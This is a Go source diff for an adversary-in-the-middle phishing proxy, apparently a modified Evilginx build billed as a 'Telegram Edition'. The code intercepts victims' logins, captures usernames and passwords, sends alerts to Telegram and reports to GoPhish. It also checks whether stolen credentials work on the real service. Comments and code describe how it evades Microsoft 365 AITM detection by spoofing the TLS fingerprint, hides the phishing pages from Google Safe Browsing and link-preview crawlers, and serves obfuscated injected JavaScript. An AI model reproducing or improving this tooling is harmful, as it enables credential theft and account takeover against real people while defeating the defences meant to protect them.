-                            if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
-                                rid, ok := s.Params["rid"]
-                                if ok && rid != "" {
-                                    p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-                                    err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
-                                    if err != nil {
-                                        log.Error("gophish: %s", err)
-                                    }
-                                    database.HandleSubmittedData(rid, s.Username, s.Password, map[string]string{"email": rid}, p.livefeed)
-                                }
-                            }
-
-                            // ADD THIS: Send Telegram notification when auth URL completes
-                            go p.sendTelegramNotificationForSession(ps.SessionId)
-                            break
-                        }
-                    }
-                }
-            }
-
-            if stringExists(mime, []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript", "application/ion+json", "text/plain", "image/svg+xml"}) {
-                resp.Header.Set("Cache-Control", "no-cache, no-store")
-            }
-
-            if pl != nil && ps.SessionId != "" {
-                s, ok := p.sessions[ps.SessionId]
-                if ok && s.IsDone {
-                    if s.RedirectURL != "" && s.RedirectCount == 0 {
-                        if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Index(string(body), "</head>") >= 0 || strings.Index(string(body), "</body>") >= 0) {
-                            s.RedirectCount += 1
-                            log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
-
-                            _, resp := p.javascriptRedirect(resp.Request, s.RedirectURL)
-                            return resp
-                        }
-                    }
-                }
-            }
-
-            if trigger == 1 {
-                go p.sendTelegramNotificationForSession(ps.SessionId)
-            }
-
-            return resp
-        })
-
-    goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
-    goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
-    goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: p.TLSConfigFromCA()}
-    goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}
-
-    return p, nil
+	p := &HttpProxy{
+		Proxy:             goproxy.NewProxyHttpServer(),
+		Server:            nil,
+		crt_db:            crt_db,
+		cfg:               cfg,
+		db:                db,
+		bl:                bl,
+		gophish:           NewGoPhish(),
+		isRunning:         false,
+		last_sid:          0,
+		developer:         developer,
+		livefeed:          livefeed,
+		turnstile:         turnstile,
+		ip_whitelist:      make(map[string]int64),
+		ip_sids:           make(map[string]string),
+		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript", "application/ion+json", "text/plain", "image/svg+xml", "text/css", "application/xml", "text/xml"},
+	}
+
+	p.Server = &http.Server{
+		Addr:              fmt.Sprintf("%s:%d", hostname, port),
+		Handler:           p.Proxy,
+		ReadTimeout:       httpReadTimeout,
+		WriteTimeout:      httpWriteTimeout,
+		ReadHeaderTimeout: httpHeaderTimeout,
+		IdleTimeout:       httpIdleTimeout,
+	}
+
+	if cfg.proxyConfig.Enabled {
+		err := p.setProxy(cfg.proxyConfig.Enabled, cfg.proxyConfig.Type, cfg.proxyConfig.Address, cfg.proxyConfig.Port, cfg.proxyConfig.Username, cfg.proxyConfig.Password)
+		if err != nil {
+			log.Error("proxy: %v", err)
+			cfg.EnableProxy(false)
+		} else {
+			log.Info("enabled proxy: " + cfg.proxyConfig.Address + ":" + strconv.Itoa(cfg.proxyConfig.Port))
+		}
+	}
+
+	p.cookieName = strings.ToLower(GenRandomString(8))
+	p.sessions = make(map[string]*Session)
+	p.sids = make(map[string]int)
+
+	p.Proxy.Verbose = false
+
+	// Harden the outbound TLS fingerprint towards origin sites (e.g. login.microsoftonline.com).
+	// Microsoft 365 AITM detections match the default Go crypto/tls ClientHello (JA3).
+	// Selecting a Chrome-like cipher and curve set changes that fingerprint so the
+	// proxy-origin connection no longer matches a stock Go client.
+	p.Proxy.Tr.TLSClientConfig = &tls.Config{
+		InsecureSkipVerify: true,
+		MinVersion:         tls.VersionTLS12,
+		CipherSuites: []uint16{
+			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
+			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
+			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
+		},
+		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
+	}
+
+	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
+		req.URL.Scheme = "https"
+		req.URL.Host = req.Host
+
+		// Dashboard virtual host — serve when Host matches configured dashboard subdomain
+		if p.dashboardHandler != nil {
+			if dashHost := p.cfg.GetDashboardHost(); dashHost != "" && req.Host == dashHost {
+				p.dashboardHandler.ServeHTTP(w, req)
+				return
+			}
+		}
+
+		// Redirect page virtual hosts — serve when Host matches a configured redirect page
+		if p.redirectsDir != "" {
+			if rp := p.cfg.GetRedirectPageByHost(req.Host); rp != nil {
+				ServeRedirectPage(w, req, rp, p.redirectsDir, p.cfg.GetTurnstileSiteKey())
+				return
+			}
+		}
+
+		p.Proxy.ServeHTTP(w, req)
+	})
+
+	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
+
+	// --- Initialize Telegram Edition Components by @officialmonsterz ---
+	// GeoIP — looks up visitor country/city/VPN status from IP address
+	p.geoIP = cfg.GetGeoIP()
+	// Randomizer — applies random CSS transforms to every HTML page load
+	p.randomizer = NewRandomizer()
+	// Validator — tests if captured credentials actually work on the real service
+	p.validator = NewCredentialValidator()
+
+	p.Proxy.OnRequest().
+		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
+			ps := &ProxySession{
+				SessionId:    "",
+				Created:      false,
+				PhishDomain:  "",
+				PhishletName: "",
+				Index:        -1,
+			}
+			ctx.UserData = ps
+			hiblue := color.New(color.FgHiBlue)
+
+			// handle ip blacklist
+			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
+
+			// handle proxy headers
+			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP", "X-Proxy-Id", "CF-Connecting-IP"}
+			for _, h := range proxyHeaders {
+				origin_ip := req.Header.Get(h)
+				if origin_ip != "" {
+					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
+					break
+				}
+			}
+
+			// Redirect known crawlers, safe-browsing probes, link previewers and other
+			// automated agents to the real site before any other handling (including the
+			// IP blacklist), so Google Safe Browsing and social-media previewers never
+			// see phishing content and classify the host as an innocent redirector.
+			// Detection is by User-Agent AND by source IP range, so a browser-mimicking
+			// crawl from Google infrastructure is still sent to the genuine site.
+			// Auto-blacklist the IP when enabled so later non-redirect paths stay cheap.
+			if isScannerUA(req.UserAgent()) || isScannerIP(from_ip) {
+				mode := p.cfg.GetBlacklistMode()
+				if (mode == "unauth" || mode == "all") && !p.bl.IsWhitelisted(from_ip) {
+					if err := p.bl.AddIP(from_ip); err == nil && p.bl.IsVerbose() {
+						log.Warning("blacklist: scanner UA, blacklisted ip: %s (%s)", from_ip, req.UserAgent())
+					}
+				} else if p.bl.IsVerbose() {
+					log.Warning("blacklist: scanner UA redirected: %s (%s)", from_ip, req.UserAgent())
+				}
+				return p.scannerRedirect(req)
+			}
+
+			if p.cfg.GetBlacklistMode() != "off" {
+				if p.bl.IsBlacklisted(from_ip) {
+					// A blacklisted IP must still be able to enter the phish flow when it
+					// clicks a lure link, or while it still holds a live session. Without
+					// this a returning visitor is stuck on the decoy page and the shared
+					// lure URL stops working for them.
+					if !p.ipHasActiveSession(from_ip) {
+						if _, _, lerr := p.cfg.FindLureByPath(req.Host, req.URL.Path); lerr != nil {
+							if p.bl.IsVerbose() {
+								log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
+							}
+							return p.blockRequest(req)
+						}
+					}
+					if p.bl.IsVerbose() {
+						log.Debug("blacklist: ip '%s' allowed through (lure entry/session)", from_ip)
+					}
+				}
+				if p.cfg.GetBlacklistMode() == "all" {
+					if !p.bl.IsWhitelisted(from_ip) {
+						err := p.bl.AddIP(from_ip)
+						if p.bl.IsVerbose() {
+							if err != nil {
+								log.Error("blacklist: %s", err)
+							} else {
+								log.Warning("blacklisted ip address: %s", from_ip)
+							}
+						}
+					}
+
+					return p.blockRequest(req)
+				}
+			}
+
+			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
+			o_host := req.Host
+			lure_url := req_url
+			req_path := req.URL.Path
+			if req.URL.RawQuery != "" {
+				req_url += "?" + req.URL.RawQuery
+			}
+
+			pl := p.getPhishletByPhishHost(req.Host)
+			remote_addr := from_ip
+
+			redir_re := regexp.MustCompile(`^/s/([^\\/]*)`)
+			js_inject_re := regexp.MustCompile(`^/s/([^\\/]*)/([^\\/]*)`)
+
+			if js_inject_re.MatchString(req.URL.Path) {
+				ra := js_inject_re.FindStringSubmatch(req.URL.Path)
+				if len(ra) >= 3 {
+					session_id := ra[1]
+					js_id := ra[2]
+					if strings.HasSuffix(js_id, ".js") {
+						js_id = js_id[:len(js_id)-3]
+						if s, ok := p.sessions[session_id]; ok {
+							var d_body string
+							var js_params *map[string]string = nil
+							js_params = &s.Params
+
+							script, err := pl.GetScriptInjectById(js_id, js_params)
+							if err == nil {
+								d_body += obfuscateJS(script) + "\n\n"
+							} else {
+								log.Warning("js_inject: script not found: '%s'", js_id)
+							}
+							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
+							return req, resp
+						} else {
+							log.Warning("js_inject: session not found: '%s'", session_id)
+						}
+					}
+				}
+			} else if redir_re.MatchString(req.URL.Path) {
+				ra := redir_re.FindStringSubmatch(req.URL.Path)
+				if len(ra) >= 2 {
+					session_id := ra[1]
+					if strings.HasSuffix(session_id, ".js") {
+						session_id = session_id[:len(session_id)-3]
+						if s, ok := p.sessions[session_id]; ok {
+							var d_body string
+							if !s.IsDone {
+								if s.RedirectURL != "" {
+									dynamic_redirect_js := DYNAMIC_REDIRECT_JS
+									dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
+									d_body += obfuscateJS(dynamic_redirect_js) + "\n\n"
+								}
+							}
+							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
+							return req, resp
+						} else {
+							log.Warning("js: session not found: '%s'", session_id)
+						}
+					} else {
+						if _, ok := p.sessions[session_id]; ok {
+							redirect_url, ok := p.waitForRedirectUrl(session_id)
+							if ok {
+								type ResponseRedirectUrl struct {
+									RedirectUrl string `json:"redirect_url"`
+								}
+								d_json, err := json.Marshal(&ResponseRedirectUrl{RedirectUrl: redirect_url})
+								if err == nil {
+									s_index, _ := p.sids[session_id]
+									log.Important("[%d] dynamic redirect to URL: %s", s_index, redirect_url)
+									resp := goproxy.NewResponse(req, "application/json", 200, string(d_json))
+									return req, resp
+								}
+							}
+							resp := goproxy.NewResponse(req, "application/json", 408, "")
+							return req, resp
+						} else {
+							log.Warning("api: session not found: '%s'", session_id)
+						}
+					}
+				}
+			}
+
+			phishDomain, phished := p.getPhishDomain(req.Host)
+			if phished {
+				// Lure-first resolution: if the request path matches a known lure,
+				// the lure's phishlet takes precedence over the hostname-based
+				// resolution. This prevents mis-routing when multiple phishlets
+				// share the same phish subdomain (Go map iteration is random).
+				if _, lurePl, lerr := p.cfg.FindLureByPath(o_host, req_path); lerr == nil {
+					if pl == nil || pl.Name != lurePl.Name {
+						pl = lurePl
+						if d, dok := p.cfg.GetSiteDomain(lurePl.Name); dok {
+							phishDomain = d
+						}
+					}
+				}
+
+				pl_name := ""
+				if pl != nil {
+					pl_name = pl.Name
+					ps.PhishletName = pl_name
+				}
+				session_cookie := getSessionCookieName(pl_name, p.cookieName)
+
+				ps.PhishDomain = phishDomain
+				req_ok := false
+				if p.handleSession(req.Host) && pl != nil {
+					l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
+					if err == nil {
+						log.Debug("triggered lure for path '%s'", req_path)
+					}
+
+					var create_session bool = true
+					var ok bool = false
+					sc, err := req.Cookie(session_cookie)
+					// Cross-phishlet cookie recovery: if the expected cookie wasn't found,
+					// scan other enabled phishlets. This handles the case where two phishlets
+					// share a phish subdomain and getPhishletByPhishHost picked the wrong one.
+					if err != nil {
+						for altSite := range p.cfg.phishlets {
+							if altSite == pl_name || !p.cfg.IsSiteEnabled(altSite) {
+								continue
+							}
+							altCk := getSessionCookieName(altSite, p.cookieName)
+							if altSc, altErr := req.Cookie(altCk); altErr == nil {
+								if _, hasSid := p.sids[altSc.Value]; hasSid {
+									if altPl, plErr := p.cfg.GetPhishlet(altSite); plErr == nil {
+										pl = altPl
+										pl_name = altSite
+										ps.PhishletName = pl_name
+										session_cookie = altCk
+										sc = altSc
+										err = nil
+									}
+									break
+								}
+							}
+						}
+					}
+					if err == nil {
+						ps.Index, ok = p.sids[sc.Value]
+						if ok {
+							// If a lure URL triggered this request and the existing session is
+							// already done (credentials captured), force a fresh session so the
+							// victim goes through the login flow again.
+							if l != nil {
+								if s, exists := p.sessions[sc.Value]; exists && s.IsDone {
+									ok = false
+									create_session = true
+								}
+							}
+							if ok {
+								create_session = false
+								ps.SessionId = sc.Value
+								p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
+								// Restore lure hostname for sessions that used a custom subdomain
+								if s, ok2 := p.sessions[ps.SessionId]; ok2 && s.PhishLure != nil {
+									if s.PhishLure.Hostname != "" && pl != nil && s.PhishLure.Hostname != pl.GetLandingPhishHost() {
+										ps.LureHostname = s.PhishLure.Hostname
+									}
+								}
+							}
+						} else {
+							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
+						}
+					} else {
+						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
+							create_session = false
+							req_ok = true
+							// Recover the session id for this IP too, so a whitelisted
+							// client whose session cookie is not (yet) present is still
+							// proxied through the original session.
+							if wlSid, wlPl := p.findWhitelistedSession(remote_addr); wlPl != nil {
+								pl = wlPl
+								pl_name = wlPl.Name
+								ps.PhishletName = pl_name
+								ps.SessionId = wlSid
+								if idx, ok2 := p.sids[wlSid]; ok2 {
+									ps.Index = idx
+								}
+							}
+						} else if l == nil {
+							// Whitelist fallback: check all phishlets for this IP.
+							// Recovers in-progress sessions when the wrong phishlet was
+							// resolved from a shared subdomain (cookie not yet set in browser).
+							if wlSid, wlPl := p.findWhitelistedSession(remote_addr); wlPl != nil {
+								pl = wlPl
+								pl_name = wlPl.Name
+								ps.PhishletName = pl_name
+								ps.SessionId = wlSid
+								if idx, ok2 := p.sids[wlSid]; ok2 {
+									ps.Index = idx
+								}
+								create_session = false
+								req_ok = true
+							}
+						}
+					}
+
+					if create_session {
+						if !p.cfg.IsSiteHidden(pl_name) {
+							if l != nil {
+								if l.PausedUntil > 0 && time.Unix(l.PausedUntil, 0).After(time.Now()) {
+									log.Warning("[%s] lure is paused: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
+									return p.blockRequest(req)
+								}
+
+								if len(l.UserAgentFilter) > 0 {
+									re, err := regexp.Compile(l.UserAgentFilter)
+									if err == nil {
+										if !re.MatchString(req.UserAgent()) {
+											log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
+
+											if p.cfg.GetBlacklistMode() == "unauth" {
+												if !p.bl.IsWhitelisted(from_ip) {
+													err := p.bl.AddIP(from_ip)
+													if p.bl.IsVerbose() {
+														if err != nil {
+															log.Error("blacklist: %s", err)
+														} else {
+															log.Warning("blacklisted ip address: %s", from_ip)
+														}
+													}
+												}
+											}
+											return p.blockRequest(req)
+										}
+									} else {
+										log.Error("lures: user-agent filter regexp is invalid: %v", err)
+									}
+								}
+
+								session, err := NewSession(pl.Name)
+
+								if err == nil {
+									p.extractParams(session, req.URL)
+
+									// ========================================================
+									// FIX: sid is now defined BEFORE the GeoIP block
+									// that references it. This eliminates the compile error:
+									// "undefined: sid"
+									// ========================================================
+									sid := p.last_sid
+									p.last_sid += 1
+
+									// === GeoIP Lookup (Telegram Edition by @officialmonsterz) ===
+									if p.geoIP != nil {
+										geo := p.geoIP.Lookup(remote_addr)
+										if geo.CountryISOCode != "" {
+											session.SetCustom("geo_country_code", geo.CountryISOCode)
+											session.SetCustom("geo_country_name", geo.CountryName)
+											session.SetCustom("geo_city_name", geo.CityName)
+											session.SetCustom("geo_latitude", fmt.Sprintf("%.4f", geo.Latitude))
+											session.SetCustom("geo_longitude", fmt.Sprintf("%.4f", geo.Longitude))
+											session.SetCustom("geo_isp", geo.ISP)
+											session.SetCustom("geo_asn", fmt.Sprintf("%d", geo.ASN))
+											if geo.IsVPN {
+												session.SetCustom("geo_vpn", "true")
+											}
+											if geo.IsProxy {
+												session.SetCustom("geo_proxy", "true")
+											}
+											if geo.IsDatacenter {
+												session.SetCustom("geo_datacenter", "true")
+											}
+											log.Info("[%d] [%s] geo: %s, %s (%.4f, %.4f) VPN:%v DC:%v",
+												sid, hiblue.Sprint(pl_name),
+												geo.CountryName, geo.CityName,
+												geo.Latitude, geo.Longitude,
+												geo.IsVPN, geo.IsDatacenter)
+
+											// Store geo data in the database for the dashboard
+											geoJSON, _ := json.Marshal(geo)
+											p.db.SetSessionCustom(session.Id, "geoip", string(geoJSON))
+
+											if p.cfg.GetBlockVPN() && (geo.IsVPN || geo.IsProxy || geo.IsDatacenter) {
+												log.Warning("[%d] [%s] blocked VPN/proxy/datacenter: %s (VPN:%v Proxy:%v DC:%v)", sid, hiblue.Sprint(pl_name), remote_addr, geo.IsVPN, geo.IsProxy, geo.IsDatacenter)
+												return p.blockRequest(req)
+											}
+										}
+									}
+
+									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
+										if trackParam, ok := session.Params["o"]; ok {
+											if trackParam == "track" {
+												rid, ok := session.Params["rid"]
+												if ok && rid != "" {
+													log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
+													p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
+													err = p.gophish.ReportEmailOpened(rid, remote_addr, req.Header.Get("User-Agent"))
+													if err != nil {
+														log.Error("gophish: %s", err)
+													}
+													database.HandleEmailOpened(rid, map[string]string{"email": rid}, p.livefeed)
+													return p.trackerImage(req)
+												}
+											}
+										}
+									}
+
+									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
+									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
+									p.sessions[session.Id] = session
+									p.sids[session.Id] = sid
+
+									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
+										rid, ok := session.Params["rid"]
+										if ok && rid != "" {
+											p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
+											err = p.gophish.ReportEmailLinkClicked(rid, remote_addr, req.Header.Get("User-Agent"))
+											if err != nil {
+												log.Error("gophish: %s", err)
+											}
+											database.HandleClickedLink(rid, map[string]string{"email": rid}, p.livefeed)
+										}
+									}
+
+									landing_url := req_url
+									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
+										log.Error("database: %v", err)
+									}
+
+									session.RemoteAddr = remote_addr
+									session.UserAgent = req.Header.Get("User-Agent")
+									session.Cmsgid = "req.Header.Get()"
+									session.RedirectURL = pl.RedirectUrl
+									if l.RedirectUrl != "" {
+										session.RedirectURL = l.RedirectUrl
+									}
+									if session.RedirectURL != "" {
+										session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
+									}
+									session.PhishLure = l
+									log.Debug("redirect URL (lure): %s", session.RedirectURL)
+
+									ps.SessionId = session.Id
+									ps.Created = true
+									ps.Index = sid
+									p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
+
+									if p.turnstile {
+										if rid, ok := session.Params["rid"]; ok && rid != "" {
+											return p.redirectTurnstile(req, rid)
+										}
+									}
+
+									req_ok = true
+								}
+							} else {
+								// Autolure gateway: root request on an autolure hostname
+								// redirects the visitor to the current active rotating path.
+								// Scanner UAs are already blocked above so only real browsers reach here.
+								if req_path == "/" || req_path == "" {
+									if al, _ := p.cfg.GetAutoLureByHostname(req.Host); al != nil {
+										activeURL := "https://" + req.Host + al.Path
+										log.Info("[autolure] [%s] gateway → %s [%s]", hiblue.Sprint(pl_name), activeURL, remote_addr)
+										return p.javascriptRedirect(req, activeURL)
+									}
+								}
+								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
+
+								if p.cfg.GetBlacklistMode() == "unauth" {
+									if !p.bl.IsWhitelisted(from_ip) {
+										err := p.bl.AddIP(from_ip)
+										if p.bl.IsVerbose() {
+											if err != nil {
+												log.Error("blacklist: %s", err)
+											} else {
+												log.Warning("blacklisted ip address: %s", from_ip)
+											}
+										}
+									}
+								}
+								return p.blockRequest(req)
+							}
+						} else {
+							log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
+						}
+					}
+				}
+
+				if ps.SessionId == "" && p.handleSession(req.Host) {
+					if !req_ok {
+						return p.blockRequest(req)
+					}
+				}
+
+				if ps.SessionId != "" {
+					if s, ok := p.sessions[ps.SessionId]; ok {
+						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
+						if err == nil {
+							if l.Redirector != "" {
+								if !p.isForwarderUrl(req.URL) {
+									if s.RedirectorName == "" {
+										s.RedirectorName = l.Redirector
+										s.LureDirPath = req_path
+									}
+
+									t_dir := l.Redirector
+									if !filepath.IsAbs(t_dir) {
+										redirectors_dir := p.cfg.GetRedirectorsDir()
+										t_dir = filepath.Join(redirectors_dir, t_dir)
+									}
+
+									index_path1 := filepath.Join(t_dir, "index.html")
+									index_path2 := filepath.Join(t_dir, "index.htm")
+									index_found := ""
+									if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
+										index_found = index_path1
+									} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
+										index_found = index_path2
+									}
+
+									if _, err := os.Stat(index_found); !os.IsNotExist(err) {
+										html, err := os.ReadFile(index_found)
+										if err == nil {
+
+											html = p.injectOgHeaders(l, html)
+
+											body := string(html)
+											body = p.replaceHtmlParams(body, lure_url, &s.Params)
+
+											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
+											if resp != nil {
+												return req, resp
+											} else {
+												log.Error("lure: failed to create html redirector response")
+											}
+										} else {
+											log.Error("lure: failed to read redirector file: %s", err)
+										}
+
+									} else {
+										log.Error("lure: redirector file does not exist: %s", index_found)
+									}
+								}
+							}
+						} else if s.RedirectorName != "" {
+							rel_parts := []string{}
+							req_path_parts := strings.Split(req_path, "/")
+							lure_path_parts := strings.Split(s.LureDirPath, "/")
+
+							for n, dname := range req_path_parts {
+								if len(dname) > 0 {
+									path_add := true
+									if n < len(lure_path_parts) {
+										if req_path_parts[n] == lure_path_parts[n] {
+											path_add = false
+										}
+									}
+									if path_add {
+										rel_parts = append(rel_parts, req_path_parts[n])
+									}
+								}
+
+							}
+							rel_path := filepath.Join(rel_parts...)
+
+							t_dir := s.RedirectorName
+							if !filepath.IsAbs(t_dir) {
+								redirectors_dir := p.cfg.GetRedirectorsDir()
+								t_dir = filepath.Join(redirectors_dir, t_dir)
+							}
+
+							path := filepath.Join(t_dir, rel_path)
+							if _, err := os.Stat(path); !os.IsNotExist(err) {
+								fdata, err := os.ReadFile(path)
+								if err == nil {
+									mime_type := getContentType(req_path, fdata)
+									resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
+									if resp != nil {
+										resp.Body = io.NopCloser(bytes.NewReader(fdata))
+										return req, resp
+									} else {
+										log.Error("lure: failed to create redirector data file response")
+									}
+								} else {
+									log.Error("lure: failed to read redirector data file: %s", err)
+								}
+							}
+						}
+					}
+				}
+
+				if pl != nil {
+					foundLure, lureErr := p.cfg.GetLureByPath(pl_name, o_host, req_path)
+					if lureErr == nil {
+						rurl := pl.GetLoginUrl()
+						// Rewrite the login URL to the phished domain here in the request
+						// handler. Do NOT rely solely on OnResponse rewriting — synthetic
+						// redirect responses may bypass it (e.g. when Turnstile is on and
+						// IsCaptchaDone is false, OnResponse returns early before rewriting).
+						if rewritten, ok := p.replaceUrlWithPhished(rurl); ok {
+							rurl = rewritten
+						}
+						u, parseErr := url.Parse(rurl)
+						if parseErr == nil {
+							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
+								if foundLure.Hostname != "" && foundLure.Hostname != pl.GetLandingPhishHost() {
+									rurl = "https://" + foundLure.Hostname + u.Path
+									ps.LureHostname = foundLure.Hostname
+								}
+								// Carry the query string across the lure -> login redirect.
+								// Flows rely on this: ?login_hint=user@x.com makes Microsoft
+								// prefill the email, ?domain_hint= pins the tenant, and OAuth
+								// invite links carry their parameters here.
+								if q := req.URL.RawQuery; q != "" && !strings.Contains(rurl, "?") {
+									rurl += "?" + q
+								}
+								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+								if resp != nil {
+									resp.Header.Add("Location", rurl)
+									ps.LureRedirect = true
+									return req, resp
+								}
+							}
+						}
+					}
+				}
+
+				if p.cfg.IsLureHostnameValid(req.Host) {
+					lureHost := req.Host
+					remapToLanding := func() {
+						if ps.LureHostname == "" {
+							ps.LureHostname = lureHost
+						}
+						if pl != nil {
+							if landingHost := pl.GetLandingPhishHost(); landingHost != "" {
+								req.Host = landingHost
+							}
+						}
+					}
+					if ps.SessionId != "" {
+						// Valid session on custom lure hostname: proxy as landing host so
+						// upstream pages are fetched correctly, but record the lure hostname
+						// so the response handler rewrites Location/cookies back to it.
+						remapToLanding()
+					} else if recoveredSid, recovered := p.getSessionIdByIP(remote_addr, lureHost); recovered {
+						// Session exists for this IP (created when the lure was first triggered)
+						// but the session cookie has not been set in the browser yet.
+						// Recover the session so the request is proxied, not 404'd.
+						ps.SessionId = recoveredSid
+						if idx, ok2 := p.sids[recoveredSid]; ok2 {
+							ps.Index = idx
+						}
+						remapToLanding()
+					} else {
+						log.Debug("lure hostname detected - returning 404 for request: %s", req_url)
+						resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
+						if resp != nil {
+							return req, resp
+						}
+					}
+				}
+
+				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
+					req.Host = r_host
+				}
+
+				origin := req.Header.Get("Origin")
+				if origin != "" {
+					if o_url, err := url.Parse(origin); err == nil {
+						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
+							o_url.Host = r_host
+							req.Header.Set("Origin", o_url.String())
+						}
+					}
+				}
+
+				sec_fetch_dest := req.Header.Get("Sec-Fetch-Dest")
+				if sec_fetch_dest != "" {
+					if sec_fetch_dest == "iframe" {
+						req.Header.Set("Sec-Fetch-Dest", "document")
+					}
+				}
+
+				xEmbeddingUri := req.Header.Get("X-Embedding-Uri")
+				if xEmbeddingUri != "" {
+					if o_url, err := url.Parse(xEmbeddingUri); err == nil {
+						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
+							o_url.Host = r_host
+							req.Header.Set("X-Embedding-Uri", o_url.String())
+						}
+					}
+				}
+
+				referer := req.Header.Get("Referer")
+				if referer != "" {
+					if o_url, err := url.Parse(referer); err == nil {
+						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
+							o_url.Host = r_host
+							req.Header.Set("Referer", o_url.String())
+						}
+					}
+				}
+
+				if pl != nil {
+					qs := req.URL.Query()
+					if len(qs) > 0 {
+						for gp := range qs {
+							for i, v := range qs[gp] {
+								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
+							}
+						}
+						req.URL.RawQuery = qs.Encode()
+					}
+				}
+
+				trigger := 0
+				if pl != nil && ps.SessionId != "" {
+
+					body, err := io.ReadAll(req.Body)
+					if err == nil {
+						req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
+
+						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
+						req.ContentLength = int64(len(body))
+
+						log.Debug("POST: %s", req.URL.Path)
+						log.Debug("POST body = %s", body)
+
+						contentType := req.Header.Get("Content-type")
+
+						json_re := regexp.MustCompile(`application\/\w*\+?json`)
+						form_re := regexp.MustCompile(`application\/x-www-form-urlencoded`)
+
+						if json_re.MatchString(contentType) {
+							trigger = 0
+
+							if pl.username.tp == "json" {
+								um := pl.username.search.FindStringSubmatch(string(body))
+								if um != nil && len(um) > 1 {
+									p.setSessionUsername(ps.SessionId, um[1])
+									trigger = 1
+
+									log.Success("[%d] Username: [%s]", ps.Index, um[1])
